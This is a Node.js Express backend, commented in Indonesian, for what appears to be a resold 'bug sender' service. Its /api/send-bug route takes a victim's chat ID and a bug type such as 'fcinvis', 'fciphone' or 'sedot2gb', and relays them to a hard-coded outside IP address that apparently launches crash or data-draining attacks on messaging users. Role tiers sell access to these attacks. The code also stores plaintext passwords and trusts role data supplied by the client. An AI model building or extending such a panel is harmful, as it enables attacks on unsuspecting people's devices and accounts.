const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const axios = require('axios');
const path = require('path');

// Initialize database
const adapter = new FileSync('database.json');
const db = low(adapter);

// Set some defaults if database is empty
db.defaults({ users: [] }).write();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  const user = db.get('users').find({ username, password }).value();
  
  if (user) {
    res.json({ 
      success: true, 
      user: {
        username: user.username,
        name: user.name || user.username,
        role: user.role,
        expiredDate: user.expiredDate,
        cooldown: user.cooldown
      }
    });
  } else {
    res.status(401).json({ 
      success: false, 
      message: 'Username atau password salah' 
    });
  }
});
// Tambahkan di bagian atas server.js
const BUG_TYPES_BY_ROLE = {
  member: ["fcinvis", "fcios", "Delayinvis", "fciphone"], // Member hanya bisa akses bug biasa
  reseller: ["fcinvis", "fcios", "Delayinvis", "fciphone"], // Reseller + fciphone
  reseller_vip: ["fcinvis", "fcios", "Delayinvis", "fciphone"], // Reseller VIP + sedot2gb
  ownerlite: ["fcinvis", "fcios", "Delayinvis", "fciphone", "sedot2gb", "loca"], // Ownerlite + loca
  owner: ["fcinvis", "fcios", "Delayinvis", "fciphone", "sedot2gb", "loca"] // Owner akses semua
};

// Modifikasi route /api/send-bug
app.post('/api/send-bug', async (req, res) => {
  const { target, bugType, isPrivate, currentUser } = req.body;
  
  // Cek apakah bug type allowed untuk role ini
  const allowedTypes = BUG_TYPES_BY_ROLE[currentUser.role] || [];
  if (!allowedTypes.includes(bugType)) {
    return res.status(403).json({ 
      success: false, 
      message: 'Bug type tidak diizinkan untuk role Anda' 
    });
  }

  try {
    const response = await axios.get(`http://157.230.252.105:2602/ptevolution?type=${bugType}&chatId=${target}`);
    res.json({ 
      success: true,
      api_response: response.data
    });
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      message: 'Gagal mengirim bug',
      error: error.message 
    });
  }
});

app.get('/api/accounts', (req, res) => {
  const users = db.get('users').value();
  res.json({ 
    success: true, 
    users: users.map(user => ({
      username: user.username,
      role: user.role,
      expiredDate: user.expiredDate
    }))
  });
});

app.post('/api/add-account', (req, res) => {
  const { newUser, currentUser } = req.body;
  
  // Check permissions
  if (!['owner', 'ownerlite', 'reseller', 'reseller_vip'].includes(currentUser.role)) {
    return res.status(403).json({ 
      success: false, 
      message: 'Akses ditolak' 
    });
  }
  
  // Check if username exists
  const exists = db.get('users').find({ username: newUser.username }).value();
  if (exists) {
    return res.status(400).json({ 
      success: false, 
      message: 'Username sudah digunakan' 
    });
  }
  
  // Add new user
  db.get('users').push(newUser).write();
  
  res.json({ 
    success: true,
    message: 'Akun berhasil dibuat'
  });
});

app.delete('/api/account/:username', (req, res) => {
  const { username } = req.params;
  const { currentUser } = req.body;
  
  // Only owner can delete accounts
  if (currentUser.role !== 'owner') {
    return res.status(403).json({ 
      success: false, 
      message: 'Hanya owner yang dapat menghapus akun' 
    });
  }
  
  // Can't delete self
  if (username === currentUser.username) {
    return res.status(400).json({ 
      success: false, 
      message: 'Tidak bisa menghapus akun sendiri' 
    });
  }
  
  const user = db.get('users').remove({ username }).write();
  
  if (user.length) {
    res.json({ 
      success: true,
      message: 'Akun berhasil dihapus'
    });
  } else {
    res.status(404).json({ 
      success: false, 
      message: 'Akun tidak ditemukan' 
    });
  }
});

// Serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'apophisss.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
